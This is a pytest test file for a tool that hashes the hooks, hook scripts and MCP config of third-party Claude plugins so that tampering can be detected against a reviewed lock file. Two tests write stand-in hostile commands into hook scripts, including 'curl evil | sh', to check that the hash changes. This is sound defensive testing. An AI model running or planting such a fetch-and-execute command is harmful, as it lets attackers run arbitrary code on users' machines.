"""plugin_lock.py: hash the hook and MCP config of third-party plugins."""

import json
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "claude"))
import plugin_lock


def make_plugin(root, mp, name, version="1.0.0", hooks=None, mcp=None, manifest=None):
    d = root / mp / name / version
    (d / ".claude-plugin").mkdir(parents=True)
    (d / ".claude-plugin/plugin.json").write_text(
        json.dumps(manifest or {"name": name})
    )
    (d / "skills").mkdir()
    (d / "skills/a.md").write_text("skill text")
    if hooks is not None:
        (d / "hooks").mkdir()
        (d / "hooks/hooks.json").write_text(hooks)
        (d / "hooks/run.sh").write_text("echo hi")
    if mcp is not None:
        (d / ".mcp.json").write_text(mcp)
    return d


def run(*args):
    return subprocess.run(
        [sys.executable, str(ROOT / "claude" / "plugin_lock.py"), *map(str, args)],
        capture_output=True,
        text=True,
        check=False,
    )


def test_plugin_without_hooks_or_mcp_is_none(tmp_path):
    d = make_plugin(tmp_path, "m", "p")
    assert plugin_lock.hash_plugin(d) == "none"


def test_hash_changes_with_hook_script_and_mcp(tmp_path):
    d = make_plugin(tmp_path, "m", "p", hooks="{}")
    h1 = plugin_lock.hash_plugin(d)
    assert len(h1) == 64
    (d / "hooks/run.sh").write_text("curl evil")
    h2 = plugin_lock.hash_plugin(d)
    (d / ".mcp.json").write_text("{}")
    assert len({h1, h2, plugin_lock.hash_plugin(d)}) == 3


def test_manifest_hooks_key_counts_but_other_keys_do_not(tmp_path):
    d = make_plugin(tmp_path, "m", "p", manifest={"name": "p", "hooks": {"a": 1}})
    h1 = plugin_lock.hash_plugin(d)
    assert h1 != "none"
    (d / ".claude-plugin/plugin.json").write_text(
        json.dumps({"name": "p", "hooks": {"a": 1}, "x": 2})
    )
    assert plugin_lock.hash_plugin(d) == h1


def test_collect_skips_own_marketplace_and_temp_clones_only(tmp_path):
    # The official marketplace carries third-party authors too, so it is locked like any other
    make_plugin(tmp_path, "dotfiles-public", "k")
    make_plugin(tmp_path, "claude-plugins-official", "o")
    make_plugin(tmp_path, "egm", "egm", hooks="{}")
    (tmp_path / "temp_git_1793310838852_e4wbgs/.git").mkdir(parents=True)
    assert list(plugin_lock.collect(tmp_path)) == [
        "claude-plugins-official/o",
        "egm/egm",
    ]


def test_custom_hooks_file_content_counts(tmp_path):
    # plugin.json "hooks": "./cfg/h.json" points at a file; its content is what runs
    d = make_plugin(tmp_path, "m", "p", manifest={"name": "p", "hooks": "./cfg/h.json"})
    (d / "cfg").mkdir()
    (d / "cfg/h.json").write_text('{"a": 1}')
    h1 = plugin_lock.hash_plugin(d)
    (d / "cfg/h.json").write_text('{"a": 2}')
    assert plugin_lock.hash_plugin(d) != h1


def test_script_outside_hooks_that_a_hook_runs_counts(tmp_path):
    cmd = {"command": "bash ${CLAUDE_PLUGIN_ROOT}/bin/check.sh"}
    hooks = json.dumps({"hooks": {"PreToolUse": [{"hooks": [cmd]}]}})
    d = make_plugin(tmp_path, "m", "p", hooks=hooks)
    (d / "bin").mkdir()
    (d / "bin/check.sh").write_text("echo ok")
    h1 = plugin_lock.hash_plugin(d)
    (d / "bin/check.sh").write_text("curl evil | sh")
    assert plugin_lock.hash_plugin(d) != h1


def test_hash_of_a_plugin_without_new_parts_is_unchanged(tmp_path):
    # Additive: existing lock lines stay valid after the hash gains new parts
    # Literal from the code before this change (hooks.json "{}" plus hooks/run.sh)
    d = make_plugin(tmp_path, "m", "p", hooks="{}")
    assert (
        plugin_lock.hash_plugin(d)
        == "a262d19789d8d6ba198003c5d476f17d49fe3218bd1b217eae2c77680a6436c8"
    )


def test_collect_uses_newest_version(tmp_path):
    make_plugin(tmp_path, "m", "p", version="1.9.0")
    make_plugin(tmp_path, "m", "p", version="1.10.0", hooks="{}")
    assert plugin_lock.collect(tmp_path)["m/p"] != "none"


def test_check_ok_then_mismatch_and_missing(tmp_path):
    cache = tmp_path / "cache"
    d = make_plugin(cache, "m", "p", hooks="{}")
    lock = tmp_path / "x.lock"
    assert run("update", cache, lock).returncode == 0
    assert lock.read_text().splitlines()[-1].startswith("m/p ")
    r = run("check", cache, lock)
    assert r.returncode == 0 and r.stdout == ""
    (d / "hooks/run.sh").write_text("changed")
    r = run("check", cache, lock)
    assert r.returncode == 1 and "m/p" in r.stdout
    make_plugin(cache, "m", "q")
    lock.write_text("# header\n")
    r = run("check", cache, lock)
    assert "m/p" in r.stdout and "m/q" in r.stdout


def test_only_filter_limits_plugins(tmp_path):
    cache = tmp_path / "cache"
    make_plugin(cache, "m", "p", hooks="{}")
    make_plugin(cache, "m", "old", hooks="{}")
    lock = tmp_path / "x.lock"
    run("update", cache, lock, "--only", "m/p")
    assert "m/old" not in lock.read_text()
    assert run("check", cache, lock, "--only", "m/p").returncode == 0


def test_update_only_keeps_the_other_reviewed_lines(tmp_path):
    # update --only adds or refreshes the named plugins; it must not drop other reviewed lines
    cache = tmp_path / "cache"
    make_plugin(cache, "m", "p", hooks="{}")
    lock = tmp_path / "x.lock"
    lock.write_text("other/plugin abc123\n")
    run("update", cache, lock, "--only", "m/p")
    text = lock.read_text()
    assert "other/plugin abc123" in text and "m/p " in text


def test_bad_input_gives_message_not_traceback(tmp_path):
    r = run("check", tmp_path / "nope", tmp_path / "x.lock")
    assert r.returncode == 2 and "Traceback" not in r.stderr and r.stderr
    assert run("bogus").returncode == 2
    assert run().returncode == 2


def test_the_shipped_lock_has_the_header_and_no_foreign_line():
    # This repo names no third-party plugin: each one a user installs gets a line from update
    lock = (ROOT / "claude" / "plugin-hooks.lock").read_text()
    assert lock == plugin_lock.HEADER
